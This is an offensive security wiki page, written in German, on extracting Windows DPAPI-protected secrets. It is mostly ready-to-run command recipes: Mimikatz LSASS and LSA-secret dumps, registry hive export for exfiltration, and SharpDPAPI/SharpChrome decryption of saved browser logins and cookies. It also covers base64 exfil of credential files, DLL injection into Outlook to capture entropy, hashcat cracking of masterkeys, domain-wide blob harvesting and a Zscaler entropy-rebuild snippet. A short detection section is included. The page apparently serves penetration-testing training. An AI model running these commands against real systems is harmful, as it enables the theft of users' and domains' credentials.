# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird hauptsächlich innerhalb des Windows-Betriebssystems für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet, wobei Benutzer- oder Systemgeheimnisse als wichtige Entropiequelle genutzt werden. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, da sie Daten mit einem Schlüssel verschlüsseln können, der aus den Anmeldeinformationen des Benutzers oder bei der Systemverschlüsselung aus den Domänen-Authentifizierungsgeheimnissen des Systems abgeleitet wird. Dadurch müssen Entwickler den Schutz des Verschlüsselungsschlüssels nicht selbst verwalten.

Die häufigste Verwendung von DPAPI erfolgt über die Funktionen **`CryptProtectData` und `CryptUnprotectData`**, mit denen Anwendungen Daten sicher innerhalb der Session des aktuell angemeldeten Prozesses verschlüsseln und entschlüsseln können. Das bedeutet, dass die verschlüsselten Daten nur von demselben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.

Darüber hinaus akzeptieren diese Funktionen auch einen **`entropy`-Parameter**, der ebenfalls während der Verschlüsselung und Entschlüsselung verwendet wird. Um etwas zu entschlüsseln, das unter Verwendung dieses Parameters verschlüsselt wurde, muss daher derselbe Entropiewert angegeben werden, der bei der Verschlüsselung verwendet wurde.

### Generierung von Benutzerschlüsseln

DPAPI generiert für jeden Benutzer basierend auf dessen Anmeldedaten einen eindeutigen Schlüssel (genannt **`pre-key`**). Dieser Schlüssel wird aus dem Passwort des Benutzers und weiteren Faktoren abgeleitet. Der Algorithmus hängt vom Benutzertyp ab, endet aber mit einem SHA1. Bei Domänenbenutzern hängt er beispielsweise **vom NTLM-Hash des Benutzers** ab.

Dies ist besonders interessant, weil ein Angreifer, der den Passwort-Hash des Benutzers erlangen kann, Folgendes tun kann:

- **Beliebige Daten entschlüsseln, die mit DPAPI** unter Verwendung des Schlüssels dieses Benutzers verschlüsselt wurden, ohne eine API kontaktieren zu müssen
- Versuchen, das **Passwort** offline zu **cracken**, indem versucht wird, den gültigen DPAPI-Schlüssel zu generieren

Außerdem wird jedes Mal, wenn ein Benutzer Daten mit DPAPI verschlüsselt, ein neuer **master key** generiert. Dieser master key wird tatsächlich zur Verschlüsselung der Daten verwendet. Jeder master key erhält eine **GUID** (Globally Unique Identifier), die ihn identifiziert.

Die master keys werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` der Security Identifier dieses Benutzers ist. Der master key wird mit dem **`pre-key`** des Benutzers und zusätzlich mit einem **domain backup key** zur Wiederherstellung verschlüsselt (der gleiche Schlüssel wird also zweimal mit zwei verschiedenen Passwörtern verschlüsselt).

Beachte, dass sich der **domain key, der zur Verschlüsselung des master key verwendet wird, auf den Domain Controllern befindet und sich niemals ändert**. Wenn ein Angreifer Zugriff auf den Domain Controller hat, kann er daher den domain backup key abrufen und die master keys aller Benutzer in der Domäne entschlüsseln.<sup>[[2]](#references)</sup>

Die verschlüsselten Blobs enthalten in ihren Headern die **GUID des master key**, der zur Verschlüsselung der darin enthaltenen Daten verwendet wurde.

> [!TIP]
> Mit DPAPI verschlüsselte Blobs beginnen mit **`01 00 00 00`**

Master keys finden:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
So sehen mehrere Master Keys eines Benutzers aus:

![Was ist DPAPI – Generierung der Benutzer-Keys: So sehen mehrere Master Keys eines Benutzers aus](<../../images/image (1121).png>)

### Generierung von Machine/System-Keys

Dieser Key wird von der Machine zur Verschlüsselung von Daten verwendet. Er basiert auf dem **DPAPI_SYSTEM LSA secret**, einem speziellen Key, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Key wird zur Verschlüsselung von Daten verwendet, die für das System selbst zugänglich sein müssen, etwa Machine-level credentials oder systemweite Secrets.<sup>[[2]](#references)</sup>

Beachte, dass diese Keys **kein Domain-Backup haben** und daher nur lokal zugänglich sind:

- **Mimikatz** kann darauf zugreifen, indem es LSA secrets mit folgendem Befehl dumpt: `mimikatz lsadump::secrets`
- Das Secret wird in der Registry gespeichert, sodass ein Administrator **die DACL-Berechtigungen ändern könnte, um darauf zuzugreifen**. Der Registry-Pfad lautet: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Eine Offline-Extraktion aus Registry-Hives ist ebenfalls möglich. Speichere beispielsweise als Administrator auf dem Target die Hives und exfiltriere sie:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Führe dann auf deiner Analyse-Box das DPAPI_SYSTEM-LSA-Secret aus den Hives wieder zusammen und verwende es, um Blobs im Machine-Scope zu entschlüsseln (Passwörter geplanter Tasks, Service-Credentials, WLAN-Profile usw.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Durch DPAPI geschützte Daten

Zu den durch DPAPI geschützten persönlichen Daten gehören:

- Windows-Anmeldedaten
- Passwörter und Auto-Vervollständigungsdaten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Kontopasswörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüsseln
- Passwörter für Remotedesktopverbindungen, .NET Passport sowie private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, sowie persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und andere
- Verschlüsselte Blobs innerhalb der Registry
- ...

Zu den vom System geschützten Daten gehören:
- Wi-Fi-Passwörter
- Passwörter geplanter Aufgaben
- ...

### Optionen zum Extrahieren von Master Keys

- Wenn der Benutzer über Domain-Admin-Rechte verfügt, kann er auf den **domain backup key** zugreifen, um alle Master Keys der Benutzer in der Domain zu entschlüsseln:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mit lokalen Administratorrechten ist es möglich, auf den **LSASS-Speicher** zuzugreifen, um die DPAPI-Masterschlüssel aller verbundenen Benutzer und den SYSTEM-Schlüssel zu extrahieren.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Wenn der Benutzer über lokale Administratorrechte verfügt, kann er auf das **DPAPI_SYSTEM LSA secret** zugreifen, um die Master Keys des Computers zu entschlüsseln:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, kannst du die **Master Keys des Benutzers direkt entschlüsseln**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Wenn du dich innerhalb einer Session als der Benutzer befindest, ist es möglich, den DC nach dem **backup key zum Entschlüsseln der master keys mithilfe von RPC** zu fragen. Wenn du lokaler Administrator bist und der Benutzer angemeldet ist, könntest du dafür **sein session token stehlen**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault auflisten
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Zugriff auf DPAPI-verschlüsselte Daten

### DPAPI-verschlüsselte Daten finden

Häufig geschützte Dateien von Benutzern befinden sich unter:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Prüfe auch, ob `\Roaming\` in den oben genannten Pfaden durch `\Local\` ersetzt wird.

Beispiele für die Enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registry und in B64-Blobs finden:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um sensible Daten wie Cookies mit DPAPI zu entschlüsseln.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron-Kurzanleitungen (SharpChrome)

- Aktueller Benutzer, interaktive Entschlüsselung gespeicherter Logins/Cookies (funktioniert auch mit an die Anwendung gebundenen Cookies ab Chrome 127+, da der zusätzliche Schlüssel aus dem Credential Manager des Benutzers aufgelöst wird, wenn der Vorgang im Benutzerkontext ausgeführt wird):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-Analyse, wenn Sie nur Dateien haben. Extrahieren Sie zuerst den AES-State-Key aus dem „Local State“ des Profils und verwenden Sie ihn anschließend, um die Cookie-Datenbank zu entschlüsseln:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-weite/Remote-Triage, wenn du über den DPAPI domain backup key (PVK) und Admin-Rechte auf dem Zielhost verfügst:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Wenn du über den DPAPI prekey/credkey eines Benutzers (aus LSASS) verfügst, kannst du das password cracking überspringen und Profildaten direkt entschlüsseln:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notizen
- Neuere Chrome/Edge-Builds können bestimmte Cookies mit "App-Bound"-Verschlüsselung speichern. Die Offline-Entschlüsselung dieser spezifischen Cookies ist ohne den zusätzlichen appgebundenen Schlüssel nicht möglich. Führe SharpChrome im Kontext des Zielbenutzers aus, um ihn automatisch abzurufen. Siehe den unten referenzierten Chrome security blog post.<sup>[[5]](#references)</sup>

### Zugriffsschlüssel und Daten

- **Verwende SharpDPAPI**, um Anmeldedaten aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung abzurufen:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Credentials-Informationen abrufen** wie die verschlüsselten Daten und den guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Auf Masterkeys zugreifen**:

Entschlüsseln Sie einen Masterkey eines Benutzers, der den **domain backup key** über RPC anfordert:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Das **SharpDPAPI**-Tool unterstützt außerdem diese Argumente für die Masterkey-Entschlüsselung (beachte, dass `/rpc` verwendet werden kann, um den Backup-Key der Domäne abzurufen, `/password`, um ein Klartextpasswort zu verwenden, oder `/pvk`, um eine private DPAPI-Domänenschlüsseldatei anzugeben ...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Daten mit einem Masterkey entschlüsseln**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Das **SharpDPAPI**-Tool unterstützt außerdem diese Argumente für die Entschlüsselung von `credentials|vaults|rdg|keepass|triage|blob|ps` (beachte, dass `/rpc` verwendet werden kann, um den Domänen-Backup-Schlüssel abzurufen, `/password`, um ein Klartextpasswort zu verwenden, `/pvk`, um eine Datei mit dem privaten DPAPI-Domänenschlüssel anzugeben, und `/unprotect`, um die Sitzung des aktuellen Benutzers zu verwenden...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey direkt verwenden (kein Passwort erforderlich)

Wenn Sie LSASS dumpen können, legt Mimikatz häufig einen DPAPI-Schlüssel pro Anmeldung offen, mit dem die Masterkeys des Benutzers entschlüsselt werden können, ohne das Klartextpasswort zu kennen. Übergeben Sie diesen Wert direkt an das Tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Einige Daten mit der **aktuellen Benutzersitzung** entschlüsseln:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline decryption mit Impacket dpapi.py

Wenn du die SID und das Passwort des Opferbenutzers (oder den NT-Hash) hast, kannst du DPAPI-Masterkeys und Credential Manager blobs mit Impackets dpapi.py vollständig offline entschlüsseln.<sup>[[10]](#references)[[11]](#references)</sup>

- Artefakte auf der Festplatte identifizieren:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Zugehöriger Masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Wenn Dateiübertragungs-Tools unzuverlässig sind, base64-kodiere die Dateien auf dem Host und kopiere die Ausgabe:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Entschlüsseln Sie den Masterkey mit der SID und dem Passwort/Hash des Benutzers:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Verwende den entschlüsselten Masterkey, um den Credential-Blob zu entschlüsseln:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Dieser Ablauf stellt häufig Domänenanmeldedaten wieder her, die von Apps mithilfe des Windows Credential Manager gespeichert wurden, einschließlich administrativer Konten (z. B. `*_adm`).

---

### Umgang mit optionaler Entropy („Third-party entropy“)

Einige Anwendungen übergeben einen zusätzlichen **Entropy**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der korrekte Masterkey bekannt ist. Das Abrufen der Entropy ist daher beim Angreifen von auf diese Weise geschützten Anmeldedaten unerlässlich (z. B. bei Microsoft Outlook und einigen VPN-Clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine User-Mode-DLL, die die DPAPI-Funktionen innerhalb des Zielprozesses hookt und jede bereitgestellte optionale Entropy transparent aufzeichnet. Wird EntropyCapture im **DLL-injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` ausgeführt, wird eine Datei ausgegeben, die jeden Entropy-Puffer dem aufrufenden Prozess und Blob zuordnet. Die aufgezeichnete Entropy kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Offline-Cracking von masterkeys (Hashcat & DPAPISnoop)

Microsoft führte mit Windows 10 v1607 (2016) ein **context 3**-masterkey-Format ein. `hashcat` v6.2.6 (Dezember 2023) fügte die Hash-Modi **22100** (DPAPI masterkey v1 context ), **22101** (context 1) und **22102** (context 3) hinzu, die GPU-beschleunigtes Cracking von Benutzerpasswörtern direkt aus der masterkey-Datei ermöglichen. Angreifer können daher word-list- oder brute-force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatisiert den Prozess:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Das Tool kann auch Credential- und Vault-Blobs analysieren, sie mit geknackten Schlüsseln entschlüsseln und Klartext-Passwörter exportieren.<sup>[[8]](#references)</sup>


### Zugriff auf Daten anderer Rechner

In **SharpDPAPI und SharpChrome** können Sie die Option **`/server:HOST`** angeben, um auf die Daten eines Remote-Rechners zuzugreifen. Natürlich müssen Sie auf diesen Rechner zugreifen können. Im folgenden Beispiel wird vorausgesetzt, dass der **Backup-Verschlüsselungsschlüssel der Domäne bekannt ist**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Weitere Tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des Backup-Schlüssels des Domain Controllers über RPC automatisiert. Das Script ermittelt anschließend die IP-Adresse aller Computer und führt auf allen Computern einen smbclient aus, um alle DPAPI blobs aller Benutzer abzurufen und alles mit dem Domain-Backup-Schlüssel zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus LDAP extrahierten Computerliste kannst du jedes Subnetz finden, selbst wenn du es vorher nicht kanntest!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch durch DPAPI geschützte Secrets dumpen. Das 2.x-Release führte Folgendes ein:<sup>[[9]](#references)</sup>

* Parallele Sammlung von blobs von Hunderten Hosts
* Parsing von **context 3** masterkeys und automatische Integration des Hashcat cracking
* Unterstützung für verschlüsselte Chrome-„App-Bound“-Cookies (siehe nächsten Abschnitt)
* Einen neuen **`--snapshot`**-Modus, der Endpoints wiederholt abfragt und neu erstellte blobs ermittelt

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für masterkey/credential/vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional automatisch cracking ausführen kann. Er unterstützt vollständig die machine- und user-masterkey-Formate bis einschließlich Windows 11 24H1.<sup>[[8]](#references)</sup>


## Gängige Erkennungen

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
- Insbesondere über einen Network Share wie **C$** oder **ADMIN$**.
- Verwendung von **Mimikatz**, **SharpDPAPI** oder ähnlichen Tools, um auf den LSASS-Speicher zuzugreifen oder masterkeys zu dumpen.
- Event **4662**: *An operation was performed on an object* – kann mit dem Zugriff auf das **`BCKUPKEY`**-Objekt korreliert werden.
- Event **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* (Credential Manager) anfordert

---
### Sicherheitslücken und Änderungen im Ökosystem 2023–2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Network Access konnte ein Domain-Mitglied dazu bringen, einen bösartigen DPAPI-Backup-Schlüssel abzurufen, wodurch die Entschlüsselung von Benutzer-masterkeys ermöglicht wurde. Im kumulativen Update vom November 2023 gepatcht – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.<sup>[[4]](#references)</sup>
* **Chrome 127 „App-Bound“-Cookie-Verschlüsselung** (Juli 2024) ersetzte den bisherigen reinen DPAPI-Schutz durch einen zusätzlichen Schlüssel, der im **Credential Manager** des Benutzers gespeichert wird. Die Offline-Entschlüsselung von Cookies erfordert nun sowohl den DPAPI-masterkey als auch den **GCM-wrapped app-bound key**. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel wiederherstellen, wenn sie im user context ausgeführt werden.<sup>[[5]](#references)</sup>


### Fallstudie: Zscaler Client Connector – Custom Entropy abgeleitet aus der SID

Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei wird mit **DPAPI (Machine scope)** verschlüsselt, aber der Anbieter verwendet **Custom Entropy**, die *zur Laufzeit berechnet* und nicht auf dem Datenträger gespeichert wird.<sup>[[1]](#references)</sup>

Die Entropy wird aus zwei Elementen rekonstruiert:

1. Ein fest codiertes Secret, das in `ZSACredentialProvider.dll` eingebettet ist.
2. Die **SID** des Windows-Kontos, zu dem die Konfiguration gehört.

Der von der DLL implementierte Algorithmus entspricht:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, kann **jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID neu generieren** und die Blobs offline entschlüsseln:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Die Entschlüsselung liefert die vollständige JSON-Konfiguration, einschließlich jedes **device posture check** und seines erwarteten Werts – Informationen, die bei Versuchen für client-seitige Bypasses sehr wertvoll sind.

> TIP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropie (`16` Nullbytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Rechte erlangt wurden.

## Referenzen

- [1] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Security analysis and data recovery in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Reading DPAPI Encrypted Secrets with Mimikatz and C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Simple Extraction of DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
